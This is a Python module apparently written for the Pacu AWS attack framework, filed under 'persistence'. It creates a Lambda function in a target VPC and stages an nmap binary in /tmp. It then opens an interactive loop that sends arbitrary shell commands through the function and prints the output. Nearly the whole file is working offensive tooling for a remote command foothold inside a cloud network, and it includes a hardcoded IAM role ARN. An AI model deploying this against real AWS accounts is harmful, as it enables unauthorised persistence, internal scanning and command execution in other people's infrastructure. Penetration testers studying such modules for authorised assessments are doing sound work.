#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError
import os
import boto3, botocore
import datetime
import json
from pathlib import Path

module_info = {
    'name': 'lambda_executor',
    'author': 'Alexander Morgenstern',
    'category': 'persistence',
    'one_liner': 'Creates a Lambda function in a VPC to send commands through',
    'description': 'This module should be able to create a lambda function in a VPC to send commands and return output.',
    'services': ['Lambda'],
    'prerequisite_modules': [],
    'external_dependencies': [],
    'arguments_to_autocomplete': ['--vpc', '--code'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
parser.add_argument('--vpc', help='VPC to target when staging the Lambda function')
parser.add_argument(
    '--code', 
    default='',
    help='Zip file that contains the source code of the Lambda function')

FUNC_NAME = 'function_executor'

def get_code(zip_file):
    path = Path(zip_file)
    print(path)
    if path.exists():
        print('Found')
    else:
        print('Not found')
    out = ''
    with open(r'{}'.format(zip_file), 'rb') as code_file:
        out = code_file.read()
    return out

def get_role():
    return 'arn:aws:iam::216825089941:role/AlexTestRole'


def get_handler():
    return 'lambda_func.lambda_handler'


def init_function(client, role, handler, code):
    client.create_function(
        FunctionName=FUNC_NAME,
        Runtime='python3.6',
        Role=role,
        Handler=handler,
        Code={'ZipFile':code},
        Timeout=300,
    )
    return

def cleanup(client):
    client.delete_function(FunctionName=FUNC_NAME)
    return



def main(args, pacu):
    args = parser.parse_args(args)
    pacu.print('Starting module')

    client = pacu.get_boto3_client('lambda', 'ap-northeast-2')
    init_function(client, get_role(), get_handler(), get_code(args.code))

    client.invoke(FunctionName=FUNC_NAME, Payload=json.JSONEncoder().encode({"command":"cp -r tmp /tmp"}))
    client.invoke(FunctionName=FUNC_NAME, Payload=json.JSONEncoder().encode({"command":"chmod -R a+x /tmp"}))
    client.invoke(FunctionName=FUNC_NAME, Payload=json.JSONEncoder().encode({"command":"PATH=$PATH:/tmp/tmp/nmap/bin"}))

    while True:
        command = pacu.input('  Enter Command: ')
        if command == 'exit':
            break

        payload = {"command":command}
        kwargs = {
            'FunctionName':FUNC_NAME,
            'Payload':json.JSONEncoder().encode(payload)
        }

        response = client.invoke(**kwargs)
        decoded = response['Payload'].read().decode()
        decoded_json = json.JSONDecoder().decode(decoded)
        if 'body' in decoded_json:
            pacu.print('OUTPUT RETURNED:\n{}'.format(decoded_json['body']))
        else:
            pacu.print('  Output not found')
    
    cleanup(client)
    pacu.print('Ending module')
    return {}

def summary(data, pacu_main):
    out = ''
    return out
